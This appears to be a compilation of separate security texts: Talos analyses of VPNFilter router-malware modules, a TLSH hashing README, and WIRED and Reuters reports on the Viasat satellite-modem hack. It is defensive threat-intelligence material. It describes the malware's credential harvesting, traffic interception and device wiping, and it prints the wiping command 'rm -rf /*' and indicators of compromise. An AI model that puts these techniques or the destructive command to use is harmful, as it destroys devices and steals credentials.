-tcp <default syn> -s <source ip> -h/--help (print this help) If passed the ndbr argument, the 'ndbr' module will do one of three operations based on the other parameters it is passed. The SSH commands will make use of the default keys (i.e., /db_key and /cli_key) as described above.The third parameter must begin with the word start or the ndbr module uninstalls itself.If the ndbr module is executed using the following parameters: The following dropbear SSH command will be executed: This causes the dropbear SSH client to connect to a remote host and issue the ""srv_ping"" command, which is likely used to register the victim with a C2 server.If the ndbr module is executed using the following parameters: The dropbear SSH server (as described above) is started and begins listening on the port specified: If the ndbr module is executed with the following parameters: Remote port forwarding is set up by executing the following dropbear command (see above for explanation of the command options): The 'nm' module is used to scan and map the local subnet. It iterates through all interfaces and starts by ARP scanning for all hosts on the subnet associated with each IP assigned to the interface. Once an ARP reply is received, nm will send an ICMP echo request to the discovered host. If an ICMP echo reply is received it will continue mapping by performing a port scan, trying to connect to the following remote TCP ports on the host: 9, 21, 22, 23, 25, 37, 42, 43, 53, 69, 70, 79, 80, 88, 103, 110, 115, 118, 123, 137, 138, 139, 143, 150, 156, 161, 190, 197, 389, 443, 445, 515, 546, 547, 569, 3306, 8080 or 8291.Next, it uses the MikroTik Network Discovery Protocol (MNDP) to locate any other MikroTik devices on the local network. If a MikroTik device replies to the MNDP ping, nm extracts the MAC address, system identity, version number, platform type, uptime in seconds, RouterOS software ID, RouterBoard model, and interface name from the discovered device.The nm module looks in /proc/net/arp to get information about the infected device's ARP table, revealing the IP and MAC addresses of neighboring devices. Next, the entire contents of /proc/net/wireless are gathered.The module performs a traceroute by first creating a TCP connection to 8.8.8.8:53 to confirm its availability (no data is sent), then ICMP echo requests are repeatedly sent to this IP with increasing TTLs. All of the network information that is gathered is saved to a temporary file named /var/run/repsc_<time stamp>.bin. An example .bin file is as follows: The code responsible for the SSDP, CDP and LLDP functions was present within the module but was never called in the samples analyzed and therefore will always be empty. The nm module requires three command line arguments to operate properly, but only the first parameter is used. Like several other modules, the first parameter is a folder, and this is the location where the data is permanently saved. The final task performed by the nm module is the moving of the temporary .bin file containing the results of the scan to a folder specified as the first command line argument, ostensibly for later exfiltration by the main VPNFilter process. netfilter expects three arguments to be given on the command line. The first two arguments are unused, and the third argument is a quoted string in the format ""<block/unblock> <# of minutes>."" # of minutes' is how long netfilter should execute for before exiting. If block was used as the first part of the third argument, netfilter adds the following rule to iptables: After adding this rule, netfilter waits 30 seconds and then deletes this rule. If there is still time remaining based on the # of minutes value, this process begins again. The addition and deletion loop ensures that the rule persists in the event the rule is deleted from the device.Once the number of minutes has elapsed, the program exits. Signal handlers are also installed at the beginning of the netfilter program that deletes the iptables rule and then exit if the program receives either a SIGINT or SIGTERM. This is done so the device works as normal in the event someone manually terminates the netfilter program.Finally, the 'unblock' argument can be used to delete the iptables rule that was previously added using the 'block' argument.Although there are no other code paths possible, there are indications that there is or could have been something more to this module.The first indicator is that all of the different netfilter module samples that Talos analyzed (MIPS, PPC, Tile-GX) contain the same list of 168 CIDR IP addresses and ranges which tie to the following companies/services:31.13.64.51 - WhatsApp169.44.36.0/25 - WhatsApp203.205.167.0/24 - Tencent (Owner of QQ Chat)52.0.0.0/16 - Amazon.com, Inc. (The following encrypted applications have used multiple IPs in this range: Wikr, Signal, Dust and Confide)This indicates that the netfilter module may have been designed to deny access to specific forms of encrypted applications, possibly in an attempt to herd victim communications to a service that the actor preferred they use. Interestingly, Telegram, an extremely popular encrypted chat application, is missing from the list.However, we were unable to find any references to these strings in the code. All versions of netfilter that we have samples for have this same IP range list but do not appear to use it. It's possible that the samples we have are incomplete.The iptables rule that is added by the netfilter module drops TCP packets with the PUSH flag set. This rule would likely use iptables rules that block all packets not just TCP packets with the PUSH flag set if its purpose is to provide attackers with the ability to launch denial-of-service attacks using compromised devices. Typically, a rule like this would be useful as part of a man-in-the-middle attack enabling attackers with access to the devices to intercept forwarded traffic, manipulate it, then manually forward it. This might explain the list of CIDR ranges as a list of IPs to intercept. We were unable to locate any indication of this sort of functionality present within the samples that were analyzed.We have concluded that the IPs are not used. This may be due to them being left over from an older version of the netfilter module, functionality that has not yet been implemented, or there may be modifications to the statically linked iptables library made by the malware authors that we haven't found yet. The VPNFilter authors have modified open-source code before (e.g. the ndbr module), so it's not unexpected that they would change the libiptc code linked in the netfilter module. The portforwarding module is designed to be executed with the following command line arguments: Given these arguments, the portforwarding module will forward traffic from a particular port and IP combination to another port and IP by installing the following iptables rules: These rules cause any traffic passing through the infected device that is destined to IP1:PORT1 to be redirected to IP2:PORT2 instead. The second rule then changes the source address of the rerouted traffic to that of the infected device to ensure the responses are sent back to the infected device.As a precaution, before installing the iptables rules, the portforwarding module first checks that IP2 is available by creating a socket connection to IP2 on PORT2. However, no data is sent before the socket is closed.Like other modules that manipulate iptables, the portforwarding module enters a loop that adds the rules, waits a period of time, deletes the rules and then adds them again to ensure that the rules persist on the device even if they are manually deleted. The socks5proxy module is a SOCKS5 proxy server that appears to be based on the open-source project shadowsocks. The server uses no authentication and is hardcoded to listen on TCP port 5380. Before the server is started, socks5proxy forks to connect to a C2 server specified in arguments supplied to the module. If the server does not respond within a few seconds, the fork kills its parent process (the server) and then exits. The C2 server can respond with commands to execute normally or terminate the server.This module contains the following usage strings, though they do not line up with the arguments for the socks5proxy module, and these settings cannot be modified through command line arguments: The actual command line arguments for the socks5proxy module are: The socks5proxy module verifies the argument count is greater than 1, but the process crashes with a SIGSEV signal if two arguments are given, indicating that there may be limited or poor quality control during some phases of development for this malware toolchain. The tcpvpn module is a Reverse-TCP VPN, designed to allow a remote attacker to access internal networks behind infected devices. It accomplishes this by beaconing to a remote server, which could be set up like a TunTap device to forward packets over the TCP connection. The connection is seen as outbound by network devices, which may help the module bypass simple firewalls or NAT issues. This module is similar in concept to penetration testing software Cobalt Strike's VPN Pivoting.All data sent through the connection is encrypted with RC4, with a key generated by the hardcoded bytes: Which are sandwiched between the port numbers of the current connection (e.g., ""58586!;H*rK|_MwS+E!-!^yC=yJTh.ke:VynEz-~;:-Q;kQ^w^-~S;QEZh6^jgf_4RzsG80"").The command line syntax associated with the tcpvpn module are: During our research into VPNFilter, we needed to determine how some of the devices were compromised. While examining the MikroTik series of devices, we noticed an open port (TCP 8291) and that the configuration tool ""Winbox"" uses that port for communication.The traffic from these devices appeared as large blobs of binary data, so we weren't able to determine potential avenues of access using this protocol without a protocol dissector (which to our knowledge, didn't exist publicly). We decided to develop our protocol dissector for use with packet analysis tools such as Wireshark to learn more about the protocol, which would allow us to design effective rules to prevent future infections once potential attack vectors were discovered.An example of such an attack vector is CVE-2018-14847 which allows an attacker to perform a directory traversal for unauthenticated credential recovery. The dissector proved extremely helpful when we wrote coverage for this vulnerability (Snort SID: 47684). While an update for this vulnerability has been released, we think it's essential for security professionals to be able to monitor this traffic to help identify any other potentially malicious traffic.Privacy can still be maintained by ensuring that you either use ""secure mode"" to encrypt communications or download the latest Winbox client which communicates over encrypted channels only. This tool will NOT decrypt encrypted communications. The latest MikroTik CCR firmware version we tested (6.43.2), enforces the usage of this newer Winbox client though this is only enforced client-side. This means that you CAN still communicate over insecure channels using a custom-made client. Therefore, we believe this Wireshark dissector remains useful because an attacker can still deliver an exploit without having to reimplement said secure communications. The term ""Winbox"" comes from the Winbox client offered by MikroTik as an alternative to the web GUI.From the official documentation, Winbox is a small utility that allows for the administration of MikroTik RouterOS using a fast and simple GUI. It is a native Win32 binary but can be run on Linux and MacOS (OSX) using Wine, an open-source compatibility layer. All Winbox interface functions are as close as possible to mirroring the console functions â that is why there are no Winbox sections in the manual. Some of the advanced and critical system configurations are not possible from Winbox, like changing the MAC address on an interface.The term ""Winbox Protocol"" is not official, as far as we know. It's simply the term we chose since it matches the name of their client. Installation is simple, and since this is a LUA-based dissector, recompilation is not necessary. Simply drop the Winbox_Dissector.lua file into your /$HOME/.wireshark/plugins folder. By default, any TCP traffic to or from TCP port 8291 will be properly decoded as Winbox traffic once the dissector is installed.While a single message from the client/server to its destination would be preferable for parsing purposes, this is not always the case and observing live communications proved that there are many ways that Winbox messages can be formatted and sent.Below is an example of a Winbox communications capture that has the following properties: Here is how the capture is displayed before installing the dissector: The communications are correctly parsed in Wireshark following installation of the Winbox protocol dissector: To improve the security community's ability to analyze these communications and to monitor for threats that may attempt to take advantage of the Winbox Protocol, Cisco Talos is releasing this dissector for public use. For additional information and to obtain the dissector, please see the GitHub repository here. As a result of the capabilities we previously discovered in VPNFilter coupled with our new findings, we now confirm that VPNFilter provides attackers all of the functionality required to leverage compromised network and storage devices to further pivot into and attack systems within the network environments that are being targeted.It also allows attackers to leverage their access to sensitive systems such as gateway and routing devices to perform activities such as network mapping and endpoint exploitation, network communications monitoring and traffic manipulation, among other serious threats. Another dangerous capability provided by VPNFilter is the ability to turn compromised devices into proxies that could be leveraged to obfuscate the source of future, unrelated attacks by making it appear as if the attacks originate from networks previously compromised by VPNFilter. The sophisticated nature of this framework further illustrates the advanced capabilities of the threat actors making use of it, as well as the need for organizations to deploy robust defensive architectures to combat threats such as VPNFilter.With this new understanding of VPNFilter, most of our unanswered questions about the malware itself have now been answered. However, there are still significant unknowns about this threat that linger to this day:How did the actor gain initial access to affected devices? While we strongly assess that they utilized widely known, public vulnerabilities based on the makes/models affected by VPNFilter, we still don't have definitive proof of this.Is the actor attempting to reconstitute their access? Based on our telemetry and information from our partners, it appears that VPNFilter has been entirely neutralized since we and our international coalition of partners (law enforcement, intelligence organizations, and the Cyber Threat Alliance) countered the threat earlier this year. Most C2 channels for the malware have been mitigated. The stage 2 implants were non-persistent, so most have likely been cleared from infected devices. We have seen no signs of the actor attempting to reconnect with devices that may still have the persistent stage 1 with an open listener.Does this mean the actor has abandoned this expansive foothold into the small and home office (SOHO) network device space? Are they instead reconstituting their access by starting over, re-exploiting and dropping new unknown malware?

Given a byte stream with a minimum length of 50 bytes
TLSH generates a hash value which can be used for similarity comparisons.
Similar objects will have similar hash values which allows for
the detection of similar objects by comparing their hash values.  Note that
the byte stream should have a sufficient amount of complexity.  For example,
a byte stream of identical bytes will not generate a hash value. 22/09/2021 Release version 4.8.x	- merged in pull requests for more stable installation. Release version 4.9.x	- added -thread and -private options. Release version 4.10.x	- a Python clustering tool. 2020 TLSH has gained some traction. It has been included in STIX 2.1 and been ported to a number of langauges. We have added a version identifier (""T1"") to the start of the digest so that we can
cleary distinguish between different variants of the digest (such as non-standard choices of 3 byte checksum).
This means that we do not rely on the length of the hex string to determine if a hex string is a TLSH digest
(this is a brittle method for identifying TLSH digests).
We are doing this to enable compatibility, especially backwards compatibility of the TLSH approach. The code is backwards compatible, it can still read and interpret 70 hex character strings as TLSH digests.
And data sets can include mixes of the old and new digests.
If you need old style TLSH digests to be outputted, then use the command line option '-old' Thanks to Chun Cheng, who was a humble and talented engineer. The program in default mode requires an input byte stream with a minimum length of 50 bytes
(and a minimum amount of randomness - see note in Python extension below). For consistency with older versions, there is a -conservative option which enforces a 256 byte limit.
See notes for version 3.17.0 of TLSH The computed hash is 35 bytes of data (output as 'T1' followed 70 hexidecimal characters. Total length 72 characters).
The 'T1' has been added as a version number for the hash - so that we can adapt the algorithm and still maintain
backwards compatibility.
To get the old style 70 hex hashes, use the -old command line option. Bytes 3,4,5 are used to capture the information about the file as a whole
(length, ...), while the last 32 bytes are used to capture information about
incremental parts of the file.  (Note that the length of the hash can be
increased by changing build parameters described below in CMakeLists.txt,
which will increase the information stored in the hash.
For some applications this might increase the accuracy in predicting similarities between files.) Building TLSH (see below) will create a static library in the lib directory,
and the tlsh executable (a symbolic link to tlsh_unittest).
'tlsh' links to the static library, in the bin directory.
The library has functionality to generate the hash value from a given
file, and to compute the similarity between two hash values. tlsh is a utility for generating TLSH hash values and comparing TLSH
hash values to determine similarity.  Run it with no parameters for detailed usage. We list these ports just for reference.
We have not checked the code in these repositories, and we have not checked that the results are identical to TLSH here.
We also request that any ports include the files LICENSE and NOTICE.txt exactly as they appear in this repository. Download TLSH as follows: or Edit CMakeLists.txt to build TLSH with different options. Execute: Note: Building TLSH on Linux depends upon cmake to create the Makefile and then
make the project, so the build will fail if cmake is not installed.
To install cmake/gcc compiler on CentOs or Amazon Linux:
$ sudo yum install cmake
$ sudo yum install gcc-c++ Added in March 2020.
See the instructions in README.mingw Use the version-specific tlsh solution files (tlsh.VC2005.sln,
tlsh.VC2008.sln, ...) under the Windows directory. See tlsh.h for the tlsh library interface and tlsh_unittest.cpp and
simple_unittest.cpp under the test directory for example code. We have recently created a Python package on PyPi: https://pypi.org/project/py-tlsh/
The py-tlsh replaces the python-tlsh package. For details see issue 94
To install this package If you need to build your own Python package, then there is a README.python with notes about the python version Note data needs to be bytes - not a string.
This is because TLSH is for binary data and binary data can contain a NULL (zero) byte. In default mode the data must contain at least 50 bytes to generate a hash value and that
it must have a certain amount of randomness.
To get the hash value of a file, try Note: the open statement has opened the file in binary mode. The diffxlen function removes the file length component of the tlsh header from the comparison. If a file with a repeating pattern is compared to a file with only a single instance of the pattern,
then the difference will be increased if the file lenght is included.
But by using the diffxlen function, the file length will be removed from consideration. If you use the ""conservative"" option, then the data must contain at least 256 characters.
For example, should generate a hash, but will generate TNULL as it is less than 256 bytes. If you need to generate old style hashes (without the ""T1"" prefix) then use The old and conservative options may be combined: TLSH similarity is expressed as a difference score: 4.11.2 see Change_History.md"

To revist this article, visit My Profile, then View saved stories. Matt Burgess More than 22,000 miles above Earth, the KA-SAT is locked in orbit. Traveling at 7,000 miles per hour, in sync with the planetâs rotation, the satellite beams high-speed internet down to people across Europe. Since 2011, it has helped homeowners, businesses, and militaries get online. However, as Russian troops moved into Ukraine during the early hours of February 24, satellite internet connections were disrupted. A mysterious cyberattack against the satelliteâs ground infrastructureânot the satellite itselfâplunged tens of thousands of people into internet darkness. Among them were parts of Ukraineâs defenses. âIt was a really huge loss in communications in the very beginning of war,â Viktor Zhora, a senior official at Ukraineâs cybersecurity agency, the State Services for Special Communication and Information Protection (SSSCIP), reportedly said two weeks later. He did not provide any more details, and SSSCIP did not respond to WIREDâs request for comment. But the attack against the satellite internet system, owned by US company Viasat since last year, had even wider ramifications. People using satellite internet connections were knocked offline all across Europe, from Poland to France. Almost a month after the attack, the disruptions continue. Thousands still remain offline in Europeâaround 2,000 wind turbines are still disconnected in Germanyâand companies are racing to replace broken modems or fix connections with updates. Multiple intelligence agencies, including those in the US and Europe, are also investigating the attack. The Viasat hack is arguably the largest publicly known cyberattack to take place since Russia invaded Ukraine, and it stands out for its impact beyond Ukraineâs borders. But questions about the details of the attack, its purpose, and who carried it out remainâalthough experts have their suspicions. Satellite internet connections are often used in areas with low cable coverage, and they are used by everyday citizens as well as official organizations. The setup is different from your typical home or office Wi-Fi network, which mostly rely on wired broadband connections. âSatellite communications are composed of three main components,â says Laetitia Cesari Zarkan, a consultant at the United Nations Institute for Disarmament Research and a doctoral student at the University of Luxembourg. First, there is the spacecraft thatâs in orbit, which is used to send âspot beamsâ back to Earth; these beams provide internet coverage to specific areas on the ground. These beams are then picked up by satellite dishes on the ground. They can be attached to the sides of buildings, or on planes to power in-flight Wi-Fi. And finally there are ground networks, which communicate with and can configure peopleâs systems. âThe ground network is a collection of earth stations connected to the internet by fiber-optic cables,â Zarkan says. Aside from Zhoraâs comment, the Ukrainian government has remained tight-lipped about the attack. However, satellite communications, also known as satcom, appear to be frequently used in the country. Ukraine has the worldâs most transparent system for tracking government spending, and multiple government contracts show that the SSSCIP and police have purchased the technology. For instance, during Ukraineâs 2012 elections, more than 12,000 satellite internet connection points were used to monitor voting, official documents spotted by European cybersecurity firm SEKOIA.IO show. âTo disrupt satellite communications, most peopleâmyself includedâwould look at the signal in space, because it's exposed,â says Peter Lemme, an aviation specialist who also writes about satellite communications. âYou can transmit signals toward the satellite that would effectively jam its ability to receive signals from legitimate modems.â Elon Musk has claimed that Starlink satellite systems he sent to Ukraine have faced jamming attacks. Paul Starobin Morgan Meaker Arielle Pardes However, the attack against Viasat may not have involved jamming. The attack against the network was a âdeliberate, isolated, and external cyber event,â according to Viasat spokesperson Chris Phillips. The attack only impacted fixed broadband customers and didnât cause disruption to airlines or Viasatâs US government clients, the company says, and no customer data was impacted. However, peopleâs modems have not been able to connect to the network, and they have been ârendered unusable.â On Tuesday, Viasat chair Mark Dankberg told a satellite conference that the company purchased the KA-SAT in Europe last year, and its customer base is still being operated by a third party as part of the transition. âWe believe for this particular event it was preventable, but we didn't have that capability in that case,â Dankberg said, confirming that thousands of modems were taken offline. âIn most of the cases of the modems that went offline, they need to be replaced. They can be refurbished, so we're recycling modems,â Dankberg said. Kim Zetter Matt Burgess Lily Hay Newman Max G. Levy âThere is no evidence to date of any impairment to the KA-SAT satellite, core network infrastructure, or gateways due to this incident,â Phillips says in a statement. Instead Viasat says the cyberattack was the result of a misconfiguration in a âmanagement sectionâ of its network, as first reported by Reuters. The company declined to provide any more details on the technical nature of the incident, citing ongoing investigations. Viasat says it is now focusing on recovering from the partial outage. No government has officially attributed the attack to Russia, despite speculation it may have caused the attack to disrupt communications in Ukraine. Dankberg told CNBC on Monday that he couldnât confirm whether Russia was behind the attack, and that governments would be the source of such attribution. It is rare for governments to quickly attribute cyberattacks to a country or actor, as investigations are complex and take time to complete. However, Western officials say the attack would be in keeping with Russiaâs playbook. âWere it to be attributed ultimately to Russia, it would very much fit within what we would expect them to do, which is to use their cyber capabilities to ultimately support their military campaign,â Western officials told reporters during an on-background briefing last week. The US National Security Agency (NSA), and ANSSI, Franceâs cybersecurity agency, are investigating the hack. The US Federal Bureau of Investigation has issued an advisory with the US Cybersecurity and Infrastructure Security Agency (CISA) that warns of satcom hacks. âCISA remains concerned about the threat to US and alliesâ satellite communications networks,â Eric Goldstein, CISA's executive assistant director for cybersecurity, said in a statement. Hacking threats to satcom arenât new. In 2014 security researcher Ruben Santamarta published research showing the many ways satellite communications could potentially be hacked. In 2018, Santamartaâs follow-up research demonstrated how this could be done, including a focus on satellite systems in military situations. Santamarta says it is possible the attackers in the Viasat caseâalthough their identity and motive is unknownâmay have been able to deploy a malicious firmware update that sabotaged customer modems. âWe have the option that the intended goal of the attackers was to actually break the terminals in order to disable the communications,â Santamarta says. âOr maybe they were expecting to deploy a specific payload to maybe eavesdrop on communications and something went wrong and the terminals were bricked. At this point, we don't know what really happened.â While many of the details of the Viasat hack are still unravelingâindependent security researchers are examining the code on bricked modemsâits impacts have been widely felt. The cyberattack appears to be a prominent example of spillover, where an attack spreads, either intentionally or accidentally, beyond its original target. In the months leading up to Russiaâs invasion of Ukraine, cybersecurity experts and governments warned that spillover damage is a huge international threat. In June 2017, for example, Russiaâs NotPetya worm spread beyond its original targets in Ukraine and caused more than $10 billion of damage around the world. Kim Zetter Matt Burgess Lily Hay Newman Max G. Levy âIt looks like the clearest example of spillover, whether it was or was not the most disruptive activity that was undertaken at the time,â Western officials say of the Viasat incident. The fallout seems to have spread far and wide. Satellite internet providers in Germany, the UK, France, the Czech Republic, and more saw their services impacted by the outage. Users on a satellite internet forum reported problems as far away as Morocco. âIt's hard to go for a week without the internet, but if there is no other alternative access, you just have to wait,â one user in Poland complained. The EU Agency for Cybersecurity, which is also investigating the incident, says it is aware of 27,000 users impacted by the outage, a figure first reported by WIRED Italy. In one of the first signs the hack was taking place, more than 5,800 wind turbines belonging to the German energy company Enercon were knocked offline. The disruption did not stop the turbines from spinning, but it means they canât be reset remotely if there is a fault, says Enercon spokesperson Felix Rehwald. So far Enercon has managed to get 40 percent of the affected turbines back online, and its teams are replacing their satellite modems. âWe do not believe that it was aiming at us or our customers. It seems that we are sort of âcollateral damage,ââ Rehwald says. The recovery from the incident is likely to take more time. Viasat says it is getting hundreds of customers online every day and providing people with new modems or issuing software updates that can fix their systems remotely. Jaroslav Stritecky, the CEO of Czech internet provider INTV, says the company has been contacting all of its satcom customers to see if they need new modems, Â and it will likely need to replace the majority of those that were affected. Stritecky says the work may be completed by the end of March. âThe question is if there are enough new modems to provide or to support everyone,â he adds. So far, satellites have played an important role during the war in Ukraine. Theyâve been used to capture intelligence on Russian troop movements and provided an essential way for people to communicate. But there may be legal issues that unfold around the hack. Almudena AzcÃ¡rate Ortega, an associate researcher at the UN Institute for Disarmament Research, points out that as satellite systems are used for both civilian and military purposes by multiple countries, they can sit in a complex area when it comes to international law. âIf you target a satellite that is providing certain services to a specific country involved in a conflict, you might also be depriving a neutral country of the services that same satellite provides, therefore breaching that rule of neutrality,â Ortega says. âThe reverberating effects of attacking these infrastructures can have effects that would be very deeply felt by civilians.â Kim Zetter Matt Burgess Lily Hay Newman David Nield Will Knight Andrew Couts Dhruv Mehrotra Lily Hay Newman More From WIRED Contact Â© 2023 CondÃ© Nast.

SentinelOne Labs,https://www.reuters.com/business/media-telecom/exclusive-hackers-who-crippled-viasat-modems-ukraine-are-still-active-company-2022-03-30/,"Viasat offices are shown at the company's headquarters in Carlsbad, California, U.S. March 9, 2022. Picture taken March 9, 2022. REUTERS/Mike Blake WASHINGTON, March 30 (Reuters) - Hackers who crippled tens of thousands of satellite modems in Ukraine and across Europe are still trying to hobble U.S. telecommunications company Viasat as it works to bring its users back online, a company official told Reuters. Viasat Inc (VSAT.O) has been working to recover after a cyberattack remotely disabled satellite modems just as Russian forces pushed into Ukraine in the early hours of Feb. 24. The official said a parallel attack was launched at almost exactly the same time and used ""high volumes of focused, malicious traffic"" to try and overwhelm Viasat's network and was still ongoing. ""We're still witnessing some deliberate attempts,"" the official said Tuesday. He said that Viasat was so far resisting the hackers with defensive measures but that ""we've been seeing repeated attempts by this attacker to alter that pattern to test those new mitigations and defenses."" The official - who spoke on the condition that he not be identified - briefed Reuters ahead of a report being published early Wednesday which outlines how the hackers systematically sabotaged satellite modems across Europe - and in Ukraine in particular - on the morning of Russia's invasion. The exact effect of the outage on Ukraine still is not clear, but the disruptive hack triggered ""a really huge loss in communications"" at the outset of the conflict, Ukrainian cybersecurity official Victor Zhora told reporters during a briefing on March 15.  read more  Few other details have been released since. On Friday, the Washington Post said that U.S. analysts believed that the hackers were working for Russia's military intelligence agency. The report did not identify the hackers and the Viasat official said the company would not be commenting on who might be responsible. The Russian Embassy in Washington has not responded to repeated attempts to seek comment about the hack. Viasat's report said that the intruders took advantage of a misconfigured virtual private networking device to gain remote access to the management network for the company's KA-SAT satellite, which is run by an Italy-based company called Skylogic and serves customers across Europe. Skylogic did not immediately return a message late Tuesday. The report said that it was from inside the network that the hackers sent rogue commands to tens of thousands of modems all at once, overwriting key chunks of data in the device's memory and rendering them inoperable. The report said the disruptive hack began about 6:15 a.m. Ukraine time on Feb. 24 and would eventually cripple a majority of Viasat's modems in Ukraine. The parallel attack using malicious traffic began about an hour earlier. The company declined to provide a global figure of stricken devices but the report said that nearly 30,000 fresh modems had already been shipped to distributors to bring customers back online.

SentinelOne Labs,https://blog.talosintelligence.com/2018/06/vpnfilter-update.html?m=1,"Cisco Talos, while working with our various intelligence partners, has discovered additional details regarding ""VPNFilter."" In the days since we first published our findings on the campaign, we have seen that VPNFilter is targeting more makes/models of devices than initially thought, and has additional capabilities, including the ability to deliver exploits to endpoints. Talos recently published a blog about a broad campaign that delivered VPNFilter to small home-office network devices, as well as network-attached storage devices. As we stated in that post, our research into this threat was, and is, ongoing. In the wake of that post, we have had a number of partners step forward with additional information that has assisted us in our work. This post is an update of our findings over the past week. First, we have determined that additional devices are being targeted by this actor, including some from vendors that are new to the target list. These new vendors are ASUS, D-Link, Huawei, Ubiquiti, UPVEL, and ZTE. New devices were also discovered from Linksys, MikroTik, Netgear, and TP-Link. Our research currently shows that no Cisco network devices are affected. We've provided an updated device list below. We have also discovered a new stage 3 module that injects malicious content into web traffic as it passes through a network device. At the time of our initial posting, we did not have all of the information regarding the suspected stage 3 modules. The new module allows the actor to deliver exploits to endpoints via a man-in-the-middle capability (e.g. they can intercept network traffic and inject malicious code into it without the user's knowledge). With this new finding, we can confirm that the threat goes beyond what the actor could do on the network device itself, and extends the threat into the networks that a compromised network device supports. We provide technical details on this module, named ""ssler"" below. Additionally, we've discovered an additional stage 3 module that provides any stage 2 module that lacks the kill command the capability to disable the device. When executed, this module specifically removes traces of the VPNFilter malware from the device and then renders the device unusable. Analysis of this module, called ""dstr,"" is also provided below. Finally, we've conducted further research into the stage 3 packet sniffer, including in-depth analysis of how it looks for Modbus traffic. 'ssler' (Endpoint exploitation module â JavaScript injection) The ssler module, which we pronounce as ""Esler,"" provides data exfiltration and JavaScript injection capabilities by intercepting all traffic passing through the device destined for port 80. This module is expected to be executed with a parameter list, which determines the module's behavior and which websites should be targeted. The first positional parameter controls the folder on the device where stolen data should be stored. The purpose of the other named parameters are as follows: The first action taken by the ssler module is to configure the device's iptables to redirect all traffic destined for port 80 to its local service listening on port 8888. It starts by using the insmod command to insert three iptables modules into the kernel (ip_tables.ko, iptable_filter.ko, iptable_nat.ko) and then executes the following shell commands: Note: To ensure that these rules do not get removed, ssler deletes them and then adds them back approximately every four minutes. Any outgoing web requests on port 80 are now intercepted by ssler and can be inspected and manipulated before being sent to the legitimate HTTP service. All HTTP requests are sslstripped. That is, the following changes are made to requests before being sent to the true HTTP server: If the host is in one of the dump: parameters, the details of the request are saved to the disk for exfiltration, including the URL, port and all of the request headers. If the host is not in a dump: parameter, it will only dump requests with an Authorization header or URLs that have credentials in them. URLs are determined to have credentials if they contain either the string assword= or ass= and one of the following strings in them: Any POST requests to accounts.google.com containing the string signin will also be dumped. After these modifications are made, a connection to the true HTTP server is made by ssler using the modified request data over port 80. Ssler receives the response from the HTTP server and makes the following changes to the response before passing it on to the victim: The dstr modules are used to render an infected device inoperable by deleting files necessary for normal operation. It deletes all files and folders related to its own operation first before deleting the rest of the files on the system, possibly in an attempt to hide its presence during a forensic analysis. The x86 version of the dstr module was analyzed in-depth. This module first deleted itself from the disk and then stops the execution of the parent Stage 2 process. It will then search all running process for ones named vpnfilter, security, and tor and terminate them. Next, it explicitly deletes the following files and directories: The dstr module clears flash memory by overwriting the bytes of all available /dev/mtdX devices with a 0xFF byte. Finally, the shell command rm -rf /* is executed to delete the remainder of the file system and the device is rebooted. At this point, the device will not have any of the files it needs to operate and fail to boot. Additional research on the third stage packet sniffer 'ps' (stage 3 packet sniffer) One of stage 3 packet sniffer module samples we have is the R600VPN MIPS-like (Lexra architecture) sample. This sample is a packet sniffer that is looking for basic authentication as well as monitoring ICS traffic, and is specific to the TP-LINK R600-VPN. The malware uses a raw socket to look for connections to a pre-specified IP address, only looking at TCP packets that are 150 bytes or larger (note: This is the full packet size, with headers. Depending on the size of the TCP header, the PDU could be approximately 56 to 96 bytes and still meet the criteria to get logged). It has the ability to view, but not modify, the network traffic. Very significant changes would be required to implement functionality that could modify traffic. Packets that are not on port 502, are scanned for BasicAuth, and that information is logged. These new discoveries have shown us that the threat from VPNFilter continues to grow. In addition to the broader threat surface found with additional targeted devices and vendors, the discovery of the malware's capability to support the exploitation of endpoint devices expands the scope of this threat beyond the devices themselves, and into the networks those devices support. If successful, the actor would be able to deploy any desired additional capability into the environment to support their goals, including rootkits, exfiltration capability and destructive malware. Talos would like to thank all of the individual researchers, companies and intelligence partners from around the world who have stepped forward to share information and address this threat. Your actions have helped us gain a greater understanding of this campaign, and in some cases, have directly improved the situation. We recognize this is a team sport, and truly appreciate your assistance. We will continue to monitor VPNFilter and work with our partners to understand the threat as it continues to evolve in order to ensure that our customers remain protected and the public is informed. As stated previously, we highly suspect that there are additional IOCs and versions of this malware that we are not currently aware of. The following list of IOCs comprises what we know as of this date. News IOCs are in BOLD below. photobucket[.]com/user/nikkireed11/library photobucket[.]com/user/kmila302/library photobucket[.]com/user/lisabraun87/library photobucket[.]com/user/eva_green1/library

	 Save to Folio With the internet of things (IoT) gaining more popularity, common IoT devices such as routers, printers, cameras, and network-attached storage (NAS) devices, are becoming more frequent targets for cybercriminals. Unlike typical operating systems such as Windows and macOS, users are less likely to patch IoT devices. This is because users find the task more difficult and inconvenient since, in comparison, the operating systems of these devices have no auto-update feature and some manufacturers rarely even issue security updates at all. These are the kinds of systems that users log on to once in order to set them up and then never to do so again, unless they encounter a big problem. It also is not rare to find an outdated router â one that has been running for as long as the system has. As a result, many systems are left wide open to known vulnerabilities, which can lead to successful attacks even years after the first infection. While looking at these types of infections by known malware families, we found that one of the biggest reported malware families was from 2018âs VPNFilter. VPNFilter is a malware type that affects routers and storage devices by using backdoor accounts and exploits of several known vendors. In May 2018, Cisco Talos released the first report on the malware, which showed how VPNFilter was designed to gain a foothold into networks and look for Modbus traffic. However, it should be noted that this was not the only plug-in but rather merely one of the plug-ins that could be deployed. Modbus is a popular industrial control system (ICS) communication protocol that is specific to these types of systems. While the malware tends to focus on compromising consumer-grade IoT devices, it is also true that consumer devices are often found as part of ICS systems for various reasons. Some reasons include the fact that these devices are easy to deploy, provide remote vendor access, or simply because they are mistakenly added by the administrator. That the malware potentially targets control systems could be the reason that the FBI has attributed the first reported attack to the work of nation-state actors. VPNFilter operates in multiple stages that include initial infection, command-and-control (C&C) communications, and the third stage, in which the payloads are deployed. These payloads perform the tasks that the malware has been intended to do. This is also where the Modbus portion of the malware is found. The first stage of the malware involves gaining access to specific devices from over 12 vendors. Once this is done, the second stage of the malware involves an attempt to connect to Photobucket, an image-hosting site, to download an image that has the IP address of the C&C server embedded in the GPS coordinates of the exchangeable image file format, also known as Exif. If this fails, then it will try to reach out to the domain toknowall[.]com to download an image with the C&C server also embedded in the file. Finally, if both these two attempts fail, it will open a listener to monitor all incoming packets for a specially crafted TCP packet that would contain the IP address of the C&C server. While VPNFilter gained considerable attention and became a threat when it was first discovered, this happened back in 2018. This means that several mitigation tactics have already been used to render VPNFilter essentially offline. With domain seizures and every action taken to stop the malware, therefore, it is worth asking why there are still infections out there. The FBIâs statement at the time of the malwareâs discovery advised users to restart potentially affected devices to temporarily disrupt the malware. The statement also meant that by restarting the router users would essentially remove any current first-stage and third-stage malware based on the 